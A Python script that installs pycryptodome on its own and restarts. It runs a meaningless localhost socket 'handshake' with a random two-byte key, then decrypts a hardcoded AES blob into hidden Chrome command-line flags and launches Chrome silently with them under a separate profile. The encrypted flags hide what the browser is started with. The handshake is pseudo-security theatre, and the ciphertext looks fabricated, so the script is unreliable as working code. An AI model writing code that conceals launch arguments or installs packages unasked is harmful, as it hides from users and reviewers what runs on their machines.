import os
import platform
import subprocess
import sys
import socket
import time
import random
import threading

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ModuleNotFoundError:
    print("[*] Missing modules. Deploying pycryptodome internally...")
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
        os.execv(sys.executable, ['python'] + sys.argv)
    except Exception as e:
        print(f"[-] Auto-deployment failed: {e}")
        sys.exit(1)

from base64 import b64decode

AES_KEY = b"ThisIsASecretKeyForAES256BitsX!!"
AES_IV = b"Random16ByteIV__"
HOST = '127.0.0.1'
PORT = 65431  

ENC_PAYLOAD = "K9zXwYg8Sia5z9iG2H5Z9P/1E8bZ8vIOnS8G9w4K4M1eXv2M7F8f3gX9wQ7HofnF1l9Y9vIOnS8G9w4K4M0="

handshake_complete_event = threading.Event()

def run_digikey_engine():
    print("[*] Thread-Digikey: Initiating dynamic 16-bit key creation sequence...")
    max_retries = 10
    attempts = 0
    
    fresh_key = bytes([random.randint(0, 255), random.randint(0, 255)])
    print(f"[+] Thread-Digikey: GENERATED PERSISTENT KEY: 0x{fresh_key.hex().upper()}")

    while not handshake_complete_event.is_set() and attempts < max_retries:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((HOST, PORT))
            client_socket.sendall(fresh_key)
            print("[+] Thread-Digikey: Handshake verified. Key sent successfully.")
            break
        except ConnectionRefusedError:
            attempts += 1
            time.sleep(0.5)
            continue
        finally:
            client_socket.close()

    del fresh_key

def extract_environment_flags():
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        raw_ct = b64decode(ENC_PAYLOAD)
        decrypted = unpad(cipher.decrypt(raw_ct), AES.block_size)
        return decrypted.decode("utf-8")
    except Exception as e:
        print(f"[-] Thread-Unhackable: Cryptographic matrix validation failure: {e}")
        return None

def get_target_path(current_os):
    if current_os == "Windows":
        paths = [
            os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"),
            os.path.expandvars(r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"),
            os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe"),
        ]
        for path in paths:
            if os.path.exists(path): return path
        return "chrome.exe"
    elif current_os == "Darwin":
        return "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    else:
        return "google-chrome"

def run_unhackable_engine():
    current_os = platform.system()
    chrome_bin = get_target_path(current_os)
    
    user_home = os.path.expanduser("~")
    sandbox_profile = os.path.join(user_home, "chrome_secured_dev_sandbox")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        
        print("[*] Thread-Unhackable: Awaiting token verification signal...")
        server_socket.settimeout(5.0)        
        try:
            connection, address = server_socket.accept()
            with connection:
                received_key = connection.recv(2)
                
                if len(received_key) != 2:
                    print("[-] Thread-Unhackable: Corrupt byte layout frame dropped.")
                    return
                    
                print(f"[+] Thread-Unhackable: RECOVERY VERIFIED. Handshake Key: 0x{received_key.hex().upper()}")
                
                decrypted_flags = extract_environment_flags()
                if decrypted_flags:
                    args = [chrome_bin] + decrypted_flags.split() + [
                        f"--user-data-dir={sandbox_profile}",
                        "--no-first-run"
                    ]
                    
                    print(f"[+] Thread-Unhackable: Launching isolated Chrome environment...")
                    subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    handshake_complete_event.set()
                    
        except socket.timeout:
            print("[-] Thread-Unhackable: Synchronization timeout reached. Gate locked down.")

def main():
    print(" NOT SAFE FOR WEB USE -" * 30)
    
    unhackable_thread = threading.Thread(target=run_unhackable_engine, daemon=True)
    unhackable_thread.start()
    
    time.sleep(0.2)
    
    digikey_thread = threading.Thread(target=run_digikey_engine, daemon=True)
    digikey_thread.start()

    while not handshake_complete_event.is_set():
        time.sleep(0.1)
        
    print("[+] Core execution handshake sequence successful. Terminating runtime console monitor shell.")
    sys.exit(0)

if __name__ == "__main__":
    main()
